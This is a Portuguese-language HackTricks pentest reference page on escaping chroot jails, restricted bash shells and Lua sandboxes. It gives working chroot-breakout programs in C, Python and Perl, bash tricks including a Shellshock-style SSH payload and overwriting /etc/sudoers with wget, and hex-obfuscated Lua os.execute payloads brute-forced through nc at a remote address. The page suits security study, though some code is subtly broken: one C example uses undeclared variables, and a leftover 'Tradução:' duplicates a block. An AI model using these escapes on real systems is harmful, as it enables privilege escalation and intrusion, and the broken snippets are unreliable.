# Escapando de Jails

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Participe do grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou do grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>

## **GTFOBins**

**Pesquise em** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **se você pode executar algum binário com a propriedade "Shell"**

## Escapes de Chroot

Da [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): O mecanismo chroot **não é destinado a defender** contra manipulações intencionais por **usuários privilegiados** (**root**). Na maioria dos sistemas, os contextos chroot não se acumulam corretamente e programas chrooted **com privilégios suficientes podem realizar um segundo chroot para escapar**.\
Geralmente, isso significa que para escapar você precisa ser root dentro do chroot.

{% hint style="success" %}
A **ferramenta** [**chw00t**](https://github.com/earthquake/chw00t) foi criada para abusar dos seguintes cenários e escapar de `chroot`.
{% endhint %}

### Root + CWD

{% hint style="warning" %}
Se você é **root** dentro de um chroot, você **pode escapar** criando **outro chroot**. Isso porque 2 chroots não podem coexistir (no Linux), então se você criar uma pasta e depois **criar um novo chroot** nessa nova pasta estando **fora dela**, você agora estará **fora do novo chroot** e, portanto, estará no FS.

Isso ocorre porque geralmente chroot NÃO move seu diretório de trabalho para o indicado, então você pode criar um chroot mas estar fora dele.
{% endhint %}

Geralmente você não encontrará o binário `chroot` dentro de um jail chroot, mas você **pode compilar, fazer upload e executar** um binário:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>

Tradução:

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

{% hint style="warning" %}
Isso é semelhante ao caso anterior, mas neste caso o **atacante armazena um descritor de arquivo para o diretório atual** e depois **cria o chroot em uma nova pasta**. Finalmente, como ele tem **acesso** a esse **FD** **fora** do chroot, ele acessa e **escapa**.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
FD pode ser passado por Unix Domain Sockets, então:

* Crie um processo filho (fork)
* Crie um UDS para que o pai e o filho possam se comunicar
* Execute chroot no processo filho em uma pasta diferente
* No processo pai, crie um FD de uma pasta que está fora do chroot do novo processo filho
* Passe para o processo filho esse FD usando o UDS
* O processo filho faz chdir para esse FD, e como está fora do seu chroot, ele escapará da prisão
{% endhint %}

### Root + Mount

{% hint style="warning" %}
* Montando o dispositivo raiz (/) em um diretório dentro do chroot
* Fazendo chroot para esse diretório

Isso é possível no Linux
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* Monte procfs em um diretório dentro do chroot (se ainda não estiver)
* Procure por um pid que tenha uma entrada de root/cwd diferente, como: /proc/1/root
* Faça chroot nessa entrada
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* Crie um Fork (processo filho) e faça chroot em uma pasta mais profunda no FS e CD nela
* A partir do processo pai, mova a pasta onde o processo filho está para uma pasta anterior ao chroot dos filhos
* Esse processo filho se encontrará fora do chroot
{% endhint %}

### ptrace

{% hint style="warning" %}
* Há algum tempo, usuários podiam depurar seus próprios processos a partir de um processo de si mesmos... mas isso já não é possível por padrão
* De qualquer forma, se for possível, você poderia usar ptrace em um processo e executar um shellcode dentro dele ([veja este exemplo](linux-capabilities.md#cap_sys_ptrace)).
{% endhint %}

## Bash Jails

### Enumeração

Obtenha informações sobre a prisão:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### Modificar PATH

Verifique se você pode modificar a variável de ambiente PATH
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Usando vim
```bash
:set shell=/bin/sh
:shell
```
### Criar script

Verifique se você pode criar um arquivo executável com _/bin/bash_ como conteúdo
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Obter bash via SSH

Se você está acessando via ssh, pode usar este truque para executar um shell bash:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Declarar
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Você pode sobrescrever, por exemplo, o arquivo sudoers
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Outros truques

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io)\
**Também pode ser interessante a página:**

{% content-ref url="../useful-linux-commands/bypass-bash-restrictions.md" %}
[bypass-bash-restrictions.md](../useful-linux-commands/bypass-bash-restrictions.md)
{% endcontent-ref %}

## Python Jails

Truques sobre como escapar de python jails na seguinte página:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Lua Jails

Nesta página você pode encontrar as funções globais às quais tem acesso dentro de lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Eval com execução de comando:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Algumas dicas para **chamar funções de uma biblioteca sem usar pontos**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Enumerar funções de uma biblioteca:
```bash
for k,v in pairs(string) do print(k,v) end
```
Observe que toda vez que você executa o one liner anterior em um **ambiente lua diferente, a ordem das funções muda**. Portanto, se você precisar executar uma função específica, pode realizar um ataque de força bruta carregando diferentes ambientes lua e chamando a primeira função da biblioteca:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Obtenha um shell lua interativo**: Se você estiver dentro de um shell lua limitado, você pode obter um novo shell lua (e, com sorte, ilimitado) chamando:
```bash
debug.debug()
```
## Referências

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slides: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
